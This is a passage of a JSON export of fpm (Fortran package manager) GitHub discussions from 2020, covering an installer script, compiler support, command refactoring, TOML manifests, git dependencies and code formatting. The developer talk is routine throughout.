                    "text": "Damian, thanks for explaining the motivation further. I am fine putting this in. We want to include all users we can.\n\u2026\nOn Tue, Oct 13, 2020, at 4:04 PM, Damian Rouson wrote:\n\n\n @certik <https://github.com/certik> to explain the motivation further,\n I found with OpenCoarrays that\n\n  1. Downloads increased considerably after we added the installer.\n  2. Various subsets of users have different, non-overlapping\n installation preferences. A script can capture different approaches\n with various flags. For example, @awvwgk <https://github.com/awvwgk>\n prefers installing `stack` differently.\n For every person who will read documentation and install prerequisites\n separately, I suspect there are multiple people who will go away\n silently. Even just for my own purposes, I like having scripts so I\n don't have to (re)read the documentation to (re)install.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#206 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWAJMOAA5GDDJ5IDYADSKTFIDANCNFSM4SPOBZ6A>."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-14 16:55:16+00:00",
                    "text": "@awvwgk I think you're recommending using the system package manager to install stack.  We went with the instructions in the Haskell Stack README.  Also, many system package managers require sudo privileges, which many user lack."
                },
                {
                    "user": "rouson",
                    "date": "2020-10-14 16:59:16+00:00",
                    "text": "@certik let me know if you want CI testing set up before merging this or anything else you require.  I have many thoughts on how to beef this up, but I'm imagining the skeletal version can be merged for now and I can work on making it a more full-featured script later."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-14 17:33:11+00:00",
                    "text": "I don't think we can guarantee an install method for Stack for users without root access; Stack itself has a number of dependencies which may require root access to install.\nFrom https://docs.haskellstack.org/en/stable/README/:\n\nNote that the get.haskellstack.org script will ask for root access using sudo in order to use your platform's package manager to install dependencies and to install to /usr/local/bin.\n\nFrom https://docs.haskellstack.org/en/stable/install_and_upgrade/#linux:\n\nEnsure you have required system dependencies installed. These include GCC, GNU make, xz, perl, libgmp, libffi, and zlib. We also recommend Git and GPG. To install these using your package manager:\n\nDebian / Ubuntu: sudo apt-get install g++ gcc libc6-dev libffi-dev libgmp-dev make xz-utils zlib1g-dev git gnupg netbase\n\n\n\nA solution for non-root users may simply be to provide binaries for common platforms; I now have a branch tracking fortran-lang/master which uploads binary releases on push. I put this together as an easy solution for grabbing fpm in a CI."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-15 19:06:43+00:00",
                    "text": "@LKedward , that sounds (and from the link looks) like something that would be beneficial to have as part of this repository. Any chance you'd be willing to set it up? I think if those were \"official\" it would obviate the need for (at least anything complicated in) the install script.\nAnybody else have thoughts?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-15 19:17:28+00:00",
                    "text": "Any chance you'd be willing to set it up?\n\nYep happy to! I'll put together a pull request for discussion."
                },
                {
                    "user": "certik",
                    "date": "2020-10-27 19:47:31+00:00",
                    "text": "Hold on, I think a mistake was made in this PR. It seems to include tons of unrelated changes. @everythingfunctional did you merge more things by a mistake? When you update a PR, please ask for another review. We should be merging PRs with a nice git history that only do one thing. This PR, at least according to GitHub is mixing together many unrelated changes. It could also be just a mistake at GitHub, but in that case we should simply rebase on top of the latest master to ensure the PR is small and in this case only includes the install.sh script."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-27 20:15:10+00:00",
                    "text": "I think what Github is now showing after-the-fact is not correct. (I'm pretty sure) when I clicked merge, the only change showing was the addition of the install.sh script. There were no changes made, only merging in the master branch to make sure there were no conflicts (which was admittedly unnecessary)."
                },
                {
                    "user": "certik",
                    "date": "2020-10-27 21:27:23+00:00",
                    "text": "Before you merged, master was at the commit: 4443986, which is fine. This PR was at a commit cda71a0, and when you clicked \"Merge\", GitHub added the merge commit a22ce1c, which is now the latest master.\nIf you look at cda71a0 (i.e., this PR) and the history in there, this is what I see:\n*   cda71a0 (HEAD) Merge branch 'installer' of github.com:sourceryinstitute/fpm into installer\n|\\  \n| * b44b567 fix(install.sh): define install_path earlier\n| * de96c4a Update install.sh\n| * 7eca78c add skeletal installer\n| * d64e54a WIP: start installation script\n* | e331951 fix(install.sh): define install_path earlier\n* | 108a997 Update install.sh\n* | 6624b64 add skeletal installer\n* | 70b25be WIP: start installation script\n* |   4443986 Merge pull request #213 from everythingfunctional/bootstrap_submodule_support\n|\\ \\  \n| * | 488bdd0 Add .gitignore file in submodules example package\n| * | 03c9efc Add test with submodule example project and fix .smod naming convention\n| * | f196336 Fix CI scripts\n| * |   39cca4d Merge branch 'master' into bootstrap_submodule_support\n| |\\ \\  \n| * | | e7b135b convert buildDirectory path to native in buildProgram\n...\n\nSo it seems it is not clean --- the commits are there twice, such as b44b567 and e331951, etc. I don't quite understand how it happened, but it does not seem right.\nAnyway, we can probably keep it, since the alternative is to revert this."
                }
            ]
        },
        {
            "number": 205,
            "user": "awvwgk",
            "date": "2020-10-08 10:30:27+00:00",
            "title": "Supported compilers to build fpm",
            "text": "What range of compilers should Fortran fpm support to build itself? Question is more regarding GCC version, but we could also discuss how Intel, PGI, NAG, ... compilers should work together with Fortran fpm. Of course this requirements for Fortran fpm becomes strict requirements for all dependencies used in Fortran fpm as well.\nFor example, if we want to distribute fpm with common toolchains like homebrew and conda-forge, we will have drastic limitations on the GCC version we can use:\n\nhomebrew: GCC 5\nconda-forge: GCC 7.5\n\nSupporting GCC 5 can be hard, because many features are missing. GCC 7.5 sounds reasonable to me, even if it means we might have to workaround some know ICE or bug at some point.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-08 10:41:08+00:00",
                    "text": "I agree, 7.5 should be doable as a minimum version. I've been using 7.5.0 on Ubuntu without any problems so far. Versions prior to 7 would be too restrictive IMO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-08 14:32:58+00:00",
                    "text": "I don't think we should concern ourselves too much with supporting older compilers. I don't think most people will need or want to compile it from scratch. Most would prefer an installer, or a single executable. I think the goal for fpm should be to supply packages for the most common package managers. I.e.\n\nyum\napt\npacman\nhomebrew\nWindows installer (maybe?)\nWindows package manager (I know there are one or two but I'm not familiar with them)"
                },
                {
                    "user": "certik",
                    "date": "2020-10-08 23:06:41+00:00",
                    "text": "Also:\n\nConda\nSpack"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-09 10:07:30+00:00",
                    "text": "The other thing is CI support, for OSS we can easily cover GCC 5 to 10 and Intel 20 as well as PGI 20.7, at least I already setup CI's for those.\n\nWindows package manager (I know there are one or two but I'm not familiar with them)\n\nchoco and nuget"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-10 20:02:33+00:00",
                    "text": "Got the first GCC migrator on my conda-forge feedstocks today, so the cf toolchain will in future be GCC 9.3. I will have a look at homebrew again, maybe they migrate from GCC 5 at some point as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:04:47+00:00",
                    "text": "Since we started packaging I think this issue has kinda resolved itself. We will just package for toolchains that are recent enough to support building fpm."
                },
                {
                    "user": "certik",
                    "date": "2021-09-08 01:44:37+00:00",
                    "text": "Since we started packaging I think this issue has kinda resolved itself.\n\nBest kind of issues. :)\nYes, many things do resolve themselves like this."
                }
            ]
        },
        {
            "number": 204,
            "user": "urbanjost",
            "date": "2020-10-07 07:27:00+00:00",
            "title": "More issues for new",
            "text": "In regards to the Fortran implementation of fpm(1) I believe this\nshould close\n\n#109 fpm new should do --with-executable by default\n#110 Rename --with-executable to --bin (or --app) enhancement\n#111 introduce --lib to initalize a project with a library\n#135 Command line interface (CLI) fpm-fortran\n#138 fpm run --args \"a b c\" should become fpm run -- a b c\n#154 Implement fpm new fpm-fortran\n#196 not all directory names are valid project names\n\nand show\n   fpm help SUBCOMMAND\nextended to\n   fpm help SUBCOMMAND|FORTRAN_LANGUAGE\nThis integrates Fortran documentation into the CLI in a platform-independent\nmanner. In addition to installing packages fpm(1) already is well on it's\nway to replacing make(1)-like utilities and masks using ar(1), compiling and\nloading and creating static libraries. Some integration with debuggers,\nprofilers, and automated reformatters seems obtainable. Maybe it should be\nbe renamed \"fip\" for \"Fortran Integration and Packaging\". It is a lot easer\nto type.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-07 11:12:18+00:00",
                    "text": "Great work @urbanjost. I really like the cross-platform solution for including the Fortran man pages! I will look over in more detail later. Looks like you need to update your CLI tests?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 13:32:48+00:00",
                    "text": "I will put in the matching tests if the initial response is to go forward with the changes later today. If there were not so many nuances to color and terminal emulators I would put in the color version. That was just a quick \"what if\" idea but I liked the results."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 21:23:42+00:00",
                    "text": "It is hitting what is reported as a compiler bug in the log, which may have to do with MSWindows filenames. I renamed the git(1) repository to test if the name was the issue but from the log files it does not appear that the build is pulling the remote dependency packages. Is there a way I can clear the test to get a full build from scratch? I am hoping the filename is the issue as it passes on Linux and Mac."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 21:29:18+00:00",
                    "text": "Since --test creates test/ and --app creates app/ anyone feel  that it should be --lib and lib/ and --src and src/? I checked some other package managers and --lib and src/ seems common and lib/ is usually reserved for object files so if changed it seems --src and src/ would be a more intuitive naming if this was being done in a vacuum; but that other package managers that others may be familiar with seem to use --lib and src/ from what I have seen so far. That seems to be worth some weight (?)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 08:39:22+00:00",
                    "text": "I've built this PR on one of my Windows setups (MSYS2, MinGW-w64, gfortran 9.2.0) and I can't reproduce the internal compiler error - everything builds and tests pass. The new functionality appears to be working as well. I'm not sure what is different between my MinGW installation and that of the CI, perhaps a different gcc version? Without reproducing the error, I'm stuck for a solution.\nAn ICE is always a compiler bug, but I am highly doubtful that it is an issue with the Windows filenames since this would almost certainly produce a meaningful error message from the compiler and I don't see how it could affect compiler internals. My guess is that the Windows CI is using an older version (8?) of gfortran that has since been fixed.\n\nIs there a way I can clear the test to get a full build from scratch?\n\nWith the exception of some caching for Haskell and h-fpm, the CI builds are always completely from scratch - there is no state preserved between CI invocations. This means that the git repositories are being fetched correctly since we can see the corresponding source files being compiled.\n\nEdit: a similar ICE bug reported here https://gcc.gnu.org/bugzilla/show_bug.cgi?id=92065"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 09:19:06+00:00",
                    "text": "Okay, I've reproduced the ICE outside of MSYS2, using plain MinGW (gfortran 8.1.0). I will have a look into it today."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-10-08 09:31:51+00:00",
                    "text": "There is a new distribution of MinGW/MSYS2 that offers gfortran 10.2\n(MinGW) and 9.2 (MSYS2). Perhaps the ICE as been solved with these versions\n\nOp do 8 okt. 2020 om 11:19 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Okay, I've reproduced the ICE outside of MSYS2, using plain MinGW (gfortran\n 8.1.0). I will have a look into it today.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#204 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2LWS56BVXCGW4AHYLSJV7ZXANCNFSM4SHAJCVA>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 09:35:40+00:00",
                    "text": "I think I've found a fix @urbanjost : in package fortran-intrinsic-manpages, in file M_intrinsics.f90, change line 104 from\ncharacter(len=:),allocatable   :: textblock(:)\nto\ncharacter(len=132),allocatable   :: textblock(:)\n\nThanks @arjenmarkus, I need to update my MSYS2! I think you're probably right that this has been fixed after version 8.\nWe should probably add a separate target for MSYS2 with gfortran-9 in our CI checks for fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-08 23:42:39+00:00",
                    "text": "Thanks @LKedward. Unless the compiler was upgraded that seems to do it if I sent the length of allocatable character arrays."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-10 01:01:38+00:00",
                    "text": "During the refactoring I left out the patch to actually use the --backfill switch and to create a sample program not requiring a module if on fpm new NAME --app is used, apparently. When I pulled down the push request that was missing. Been a while so maybe I added that after the PR. Do the tests run in such a way that if I make a test program that actually runs 'fpm new' and checks for the existence of the output files will it clean up or allow that?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-10 08:03:08+00:00",
                    "text": "Yes, what you describe is allowed by the tests. You are free to create files during tests, these files cease to exist once the test completes."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-17 02:47:48+00:00",
                    "text": "Simplified the new_test.f90 test program per @LKedward, #207 tracked #204 primarily so merged the few small differences and delete #204 so except for correcting some spelling errors in some markdown files this is a much simpler change than it might appear,\nessentially fleshing out the fpm_command_line.f90 file and adding the fpm/cmds/new.f90 file and a test for the new subcommand.\nThe help text was written in txt2man(1) markdown so I could generate an HTML version easily for easier review:-HTML"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-18 01:19:26+00:00",
                    "text": "I changed the test scripts so remove the scratch files and gave the project a name of fpm_scratch_* to avoid inadvertently removing directories. The names were simple names that might possibly exist for some other reason.  I could just add the commands to the test.\nI added the specific REV for the intrinsics. I think the messages and STOP calls you are seeing are coming from a cached external dependency. There was a version where STOP and messages were added to explore other ways of testing the CLI module that were suggest here and because at that time f-fpm was doing stops and tracebacks for development purposes (I assume) that I was matching;  but that should not match the REV  in the TOML file and I do not see the messages in the webpage test logs or on my own machines.  We do not have a \"-refresh\"  function for external dependencies yet (at least in my version) so is that why you see the STOP and messages?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-18 11:07:17+00:00",
                    "text": "I could just add the commands to the test.\n\nYes, if you can put the cleanup commands in the test program instead that would be better actually!\n\nI think the messages and STOP calls you are seeing are coming from a cached external dependency.\n\nYep you are right, they went away when I built from scratch. Cheers!"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-18 17:58:31+00:00",
                    "text": "I use a preprocessor to generate the character variable declarations as Fortran sadly lacks a block text option, so I generally really do not manually generate the white space changes.  Does github have typically diff(1) options to optionally ignore whitespace differences?  I could change the preprocessor to always write the same length as an option so they come out the same width all the time, which would probably help."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-20 02:34:18+00:00",
                    "text": "Not sure if there is anything else I need to do or not? Is there a consensus  on the intrinsics? On the pro side it is intended as an additional feature to promote use of f-fpm. It is an out-of-the-box feature that promotes discussion on just what f-fpm can be -- is it purely a source package manager or is it a general interface for all things Fortran?  I would argue it could be a separate tool in a set of tools that could be accessed via f-fpm but there is not a mechanism for doing that yet. Should that be a future feature for everything like simple tools like a Fortran manual, fsplit90, dos2unix-like and expand-like programs to more elaborate features like formatters an auto-documenation tools? Anything that makes development easier an promotes better code seems fair game. I am open to removing it especially if there is momentum behind providing a simple \"tools\" utility although I have been finding I am using it quite often myself. I do not have a simple solution for the white-space issues other than I keep seeing mention of being able to toggle diff options on an off with github including ignoring white-space differences but the examples do not match up with anything I found on the github pages so far (although I did not look very long yet).  I think I addressed the other issues and would like to wrap this one up and clean up some issues with run and test. They need changed to match up with the differences between f-fpm and h-fpm and so on and make room for the other changes like working with remote dependencies to proceed. Anything else? This is getting very close to implementing all the basic functionality except for conditional recompilation and environment variables for customized builds and so on. It would be exciting to get this to the point of a functioning tool for people to try."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-20 08:25:23+00:00",
                    "text": "@urbanjost You raised a fair point, fpm in both bootstrap and Fortran variant are still lacking features. In case of the intrinsics the desired functionality is installing documentation as described in #195.\nProviding a basic install command to Fortran fpm would be the more sustainable solution than to include a feature into Fortran fpm due to the lack of the former. Regarding the other features you mentioned, maybe something like #211 would be a solution?\nNB, https://github.blog/2018-05-01-ignore-white-space-in-code-review/ works perfectly for ignoring whitespace changes."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 16:22:01+00:00",
                    "text": "Thanks @urbanjost, I don't think there's anything more you need to address currently. I think removing the intrinsic documentation was probably best since it hasn't been discussed in much detail - @awvwgk's plugin suggestion (#211) seems to address the extension of fpm's capabilities in a nicely modular manner and I agree an install command is probably the way forward there.\nAll that's left now is to get two more approvals."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:48:16+00:00",
                    "text": "I promise to review this tomorrow. Sorry for the delay."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 07:57:29+00:00",
                    "text": "Thanks for reviewing everyone, and many thanks @urbanjost! If there are no objections I will merge later today."
                }
            ]
        },
        {
            "number": 203,
            "user": "urbanjost",
            "date": "2020-10-04 15:13:42+00:00",
            "title": "refactor fpm.f90 to separate subcommand new into fpm_new_subcommand.f90",
            "text": "A simple refactoring per sugguestions by @awvwgk that pulls from fpm.f90 the code for the new subcommand into fpm_subcommand_new.f90.  The other subcommands have some overlap but new is very independent of the rest and it is an opportune time to separate new so that work can continue on #110, #109, and #111 without colliding with work rapidly progressing on the subcommand build.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-10-06 15:59:51+00:00",
                    "text": "Since it is so likely a subdirectory will be desired I made one. To accomodate the h-fpm naming rules I adjusted the filename to just command/new.f90 so the loader finds a module called command_new. Would have just gone with cmd/ but since cmd_ was already in use this seemed the clearest thing that worked and takes into account (as I understood them, at least) the requested name changes."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-06 16:22:48+00:00",
                    "text": "We should be prefixing with fpm_ so every new file should go into the already existing src/fpm directory. So in this case src/fpm/command/new.f90, I guess."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-06 23:36:14+00:00",
                    "text": "So I think this is the preferred/required file structure now."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-11 09:05:12+00:00",
                    "text": "@urbanjost I wonder why this refactoring PR includes all changes from the feature branch in #204. I would be in favour of moving this one forward, while I have some comments on #204 first. My suggestion is to build #204 on top of this PR and not the other way round."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-11 17:59:51+00:00",
                    "text": "Was holding off other changes completely hoping this one would get added. Started the other changes as a branch of this one, which several forum members gave instructions for and indicated was the standard way to proceed. Apparently that did not work or perhaps the subbranch changes are showing here? What would be the CLI commands to change it to the format you would prefer?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-12 11:24:48+00:00",
                    "text": "Yes I had a feeling this PR was being unintentionally pulled along for the ride with #204.\n@urbanjost  it looks like you are manually merging the branch 'more_issues_for_new' (PR #204) into 'urbanjs' (this PR) after each commit to 'more_issues_for_new' - this is what is dragging this branch along.\nI have reset the branch for this PR ('urbanjs') to where it original was. I have had to move the following subsequent commits to 'more_issues_for_new':\n\n0766793 check if name is a directory on backfill instead of depending on system command\na1318c3 simplify initializing git(1) repository\n\nImportant: you will need to realign your local copy to my updates before continuing:\n\nMake a backup branch of your local copies:\n\n$> git checkout urbanjs\n$> git checkout -b urbanjs-old\n$> git checkout more_issues_for_new\n$> git checkout -b more_issues_for_new-old\n\n\nFetch the latests changes\n\n$> git fetch --all\n\n\nAlign the local branches to remote\n\n$> git reset --hard origin/urbanjs\n$> git reset --hard origin/more_issues_for_new"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 10:41:16+00:00",
                    "text": "This PR is only a change in file structure - if there are no objections I will merge later today to make it easier to move forward with #204, #207."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 15:20:01+00:00",
                    "text": "Thanks again @urbanjost - I will review #207 now soon."
                }
            ]
        },
        {
            "number": 202,
            "user": "awvwgk",
            "date": "2020-10-03 16:30:47+00:00",
            "title": "Create package manifest with toml-f build interface",
            "text": "I'm experimenting a bit with the toml-f build interface to create a package manifest, instead of having TOML documents inlined in the source code.\n\n use build interface to create package manifest, instead of inlining\n each manifest type should know how to translate itself to TOML\n add constructors for each type to rapidly create a package manifest\n\nTo discuss:\n\npreferred style for package manifest (toml-f serializer is not style preserving, but serializer can be customized)\nfor fpm new in case we find an existing manifest, we can (a) do nothing, (b) overwrite or (c) merge\n\nRelated:\n\n#201 requires fpm to rewrite the package manifest",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-06 09:25:00+00:00",
                    "text": "I can see the value in this, especially for the likes of #201 for which it is necessary. Also for replacing the inline toml that we currently have, this is a much nicer approach!\nAs a user I could perhaps be slightly annoyed by the manifest being re-formatted (especially for git diffs), but this is only a minor inconvenience.\nI don't use toml enough to have an opinion on the style so I will defer to others here.\nFor fpm new I don't see the value in c) merging because auto-discovery means that the manifest doesn't actually need modifying for fpm new I don't think. I would probably prefer a) do nothing with a warning."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-06 11:59:53+00:00",
                    "text": "As a user I could perhaps be slightly annoyed by the manifest being re-formatted (especially for git diffs), but this is only a minor inconvenience.\n\nOne thing that would currently happen in this process is the conversion of all inline tables:\n [dependencies]\n-toml-f = { git = \"https://github.com/toml-f/toml-f\", tag = \"v0.2\" }\n+[dependencies.toml-f]\n+git = \"https://github.com/toml-f/toml-f\"\n+tag = \"v0.2\"\nBut I could adjust this in toml-f if you prefer to keep them (the information is there, but the serializer simply doesn't care).\nOne thing toml-f currently cannot do is preserve dotted keys:\n [dependencies]\n-toml-f.git = \"https://github.com/toml-f/toml-f\"\n+[dependencies.toml-f]\n+git = \"https://github.com/toml-f/toml-f\"\nAlso whitespace and comments are not preserved.\nIn case the package manifest is created with fpm new and managed with fpm add and so on, the diffs would always be minimal."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 18:02:19+00:00",
                    "text": "Closing this for now due to time constraints. I might give it a try at a later point again."
                }
            ]
        },
        {
            "number": 201,
            "user": "ivan-pi",
            "date": "2020-10-03 15:19:29+00:00",
            "title": "Adding a dependency",
            "text": "Quoting from DUB's documentation (DUB is D's official package manager):\n\nAdding a dependency\nWhen you find a package to use from the DUB registry, add it to the dependency list in your DUB configuration file by running dub add <packageName>.\nThe DUB registry uses git tags to determine application versioning and DUB's dependency management is designed to work best according to SemVer rules. Please follow the rules of the SemVer specification for all packages you list on the registry. See the package documentation for more information on dependency version specification.\n\nI think this would be a nice addition to fpm.\nPerhaps also other commands from DUB could be suitable for fpm: https://dub.pm/commandline",
            "comments": []
        },
        {
            "number": 200,
            "user": "LKedward",
            "date": "2020-10-03 13:16:40+00:00",
            "title": "Source processing bug fixes",
            "text": "Fixes bug where app modules are duplicated in the source list if auto-discovery is used and the app is specified in the manifest - this leads to duplicated symbols at linking;\n\n\nFixes bug where include statements are incorrectly detected where there are none;\n\n\nTests updated accordingly.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-06 09:25:41+00:00",
                    "text": "I realise I included these bug fixes in #193 which has been reviewed, so I will close this."
                }
            ]
        },
        {
            "number": 199,
            "user": "urbanjost",
            "date": "2020-10-02 15:06:45+00:00",
            "title": "system call to git(1) as a preliminary remote dependency method for Fortran fpm?",
            "text": "Since git(1) is being assumed as an installed package and being used to do an initial new project in both versions of fpm(1) would it be reasonable to use a git(1) system call in f-fpm to pull remote dependencies so that all base functions are available?\nThis would allow the f-fpm version to have basic full functionality (build,run,test,new) and allow for completing prototypical development of all of the lbase ocal platform features.  Thoughts?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 16:30:28+00:00",
                    "text": "That's exactly what the Haskell version is doing, so I'd be in favor of it, at least for now."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 16:36:17+00:00",
                    "text": "Did not realize that but that certainly goes a long way toward proving it would work!"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 16:46:08+00:00",
                    "text": "Does h-fpm then make a recursive call to h-fpm to build it as well when it builds the remote packages?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 17:01:40+00:00",
                    "text": "It doesn't launch a new process, but fetching and building the dependencies is a recursive procedure."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 17:04:32+00:00",
                    "text": "See bootstrap/src/Fpm.hs lines 540 - 677 for how it's done."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-03 13:18:36+00:00",
                    "text": "Based on this I've now added support for remote git dependencies in #193, since it only requires a small addition."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 14:17:18+00:00",
                    "text": "Fantastic. Between the f-toml interface and the work you have done on building all the fun stuff has progressed so dramatically it looks like it will be able to bootstrap itself very soon. Should I close this one?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:27:13+00:00",
                    "text": "Closing as implemented in #193"
                }
            ]
        },
        {
            "number": 198,
            "user": "urbanjost",
            "date": "2020-10-01 21:52:53+00:00",
            "title": "Pull request for comments",
            "text": "sort out branches\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\nbasic RUN subcommand\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\nbuild on proposed CLI interface to make a \"new\" and \"run\" subcommand for discussion\nbasic new,test,run added to build subcommands\nchange quoting of -- ARGS values for more platform independence and change test accordingly\nreplace cli_test test\nconsistent indenting\nerrata for NEW PR",
            "comments": []
        },
        {
            "number": 197,
            "user": "awvwgk",
            "date": "2020-09-30 17:49:42+00:00",
            "title": "Autoformatting of Fortran source?",
            "text": "Should we have a formatting tool for fpm? It would be nice to not have to worry about any whitespace related discussions in a PR and instead have a CI tests running the formatter and reporting if changes are needed to match the style guide.\nI tried lfortran fmt, fprettify and findent on fpm to check the impact, all have some drawbacks:\n\nlfortran fmt currently strips comments and use statements (using 0.8.1 from cf), fmt feature seems still WIP\nfprettify (0.3.6 from pypi) has some interesting understanding about intrinsic functions with an all or nothing setting for whitespace between the keyword and the parenthesis\nfindent (3.1.7 from cf) just handles the indentation (exactly as it says on the tin), but does not indent continuation lines with a & character\n\nSo non of those would be able to preserve any of the current files as they are. I don't have a strong preference for either of those tools, as long as it takes away the burden to check for the style guide and whitespace conventions.\nlfortran fmt and findent could be easily installed via conda in a CI workflow, fprettify can be installed by pip. Anything else I missed?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-30 19:22:22+00:00",
                    "text": "I am happy to improve lfortran fmt if you would consider using it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-30 20:10:37+00:00",
                    "text": "@certik lfortran fmt made the smallest diff not counting the missing comments and imports, so this would be great to have."
                },
                {
                    "user": "certik",
                    "date": "2020-09-30 22:45:16+00:00",
                    "text": "@awvwgk ok, I am happy to fix those. I am tracking all the improvements to lfortran fmt here: https://gitlab.com/lfortran/lfortran/-/issues/212. Anything else?\nHow about empty lines (in a subroutine, as well as between subroutines) ---- how should those be handled: ignored / reformatted, or preserved?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 22:47:31+00:00",
                    "text": "I would definitely be in favor of using an automated tool to format the code. As you mention it could save a lot of time dealing with and arguing about style.\nIf there is an existing tool that works, I'd be in favor of switching to it now. Even if there are some idiosyncrasies about the format that we may not prefer, unless there's some deal-breaker, I'd rather just not have to worry about it anymore. And then yes, we should add a step in the CI to make sure running it on all the files doesn't change them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 22:49:29+00:00",
                    "text": "My vote on empty lines would be to remove consecutive ones, so never have more than 1 blank line as a separator."
                },
                {
                    "user": "certik",
                    "date": "2020-09-30 22:51:49+00:00",
                    "text": "Right now, lfortran fmt generates empty lines between subroutines and so on. This can be made configurable. But the question I have is if it should preserve empty lines put in by the user, such as in:\nif (something) then\n    i = 5\n\n    j = 4\nend if\nCurrently this will always be transformed into:\nif (something) then\n    i = 5\n    j = 4\nend if\nSince clang-format preserves those, I think lfortran fmt should too.\nBtw, if you are willing to use it, I'll work day and night to make it work."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-01 08:48:27+00:00",
                    "text": "I'd prefer a fully-automated solution (over a pass/fail CI check) which commits formatting changes in the CI either during pull requests or on merge into master. See this article for an example.\nThe advantages of this approach are:\n\nno back-and-forth with the CI to get formatting checks to pass;\nlocal testing does not require contributors to download the formatting tool and maintain the same version between each other;\nkeeps the PR process simple for new contributors and those not familiar with git/github;\nremoves formatting workload from both contributor and reviewer;\nformatting changes are well-contained within specific formatting commits."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-01 15:12:03+00:00",
                    "text": "Good point @LKedward , I agree."
                },
                {
                    "user": "certik",
                    "date": "2020-10-01 15:28:24+00:00",
                    "text": "The way it can work is that the formatting is applied (but not committed) before running CI tests, to ensure that the CI tests actually work after applying the formatting. Then after the PR is merged, the formatting is actually committed."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-01 16:09:21+00:00",
                    "text": "The way it can work is that the formatting is applied (but not committed) before running CI tests, to ensure that the CI tests actually work after applying the formatting. Then after the PR is merged, the formatting is actually committed.\n\nI somewhat disagree. I think it should try and apply the formatting, and only if the tests fail (assuming they passed before) does it not actually commit. As a reviewer, I'd like to see the code that will actually be merged."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-01 16:35:33+00:00",
                    "text": "I got some ads for automated code style fixing some time ago solving exactly this kind of problem. I'll check if I find the app on the GH marketplace.\nIn short it does the following:\n\nruns a code formatter, (optionally) reports back the status to the PR\nin case there is a diff, it will be committed to a separate branch\nto apply the changes a PR against the authors branch is opened automatically\nthe author can review and merge those changes or fix it locally instead"
                },
                {
                    "user": "certik",
                    "date": "2020-10-01 17:56:15+00:00",
                    "text": "Yes, I've been struggling with reviewing the final code --- being the author of the formater, I know that there is a possibility of a bug in it, and so I would also like to see the final code before it gets committed. @awvwgk's solution should work."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-01 18:52:15+00:00",
                    "text": "@certik you might be right, using lfortran fmt will probably run into plenty of bugs first and the fpm code base is too small to be a good test case. But since most of us are developing open source and/or proprietary Fortran code bases, we should easily get a few hundred thousand lines of Fortran source code together for cross checking the formatter. I'll volunteer my projects to check lfortran fmt for this purpose."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-02 08:45:43+00:00",
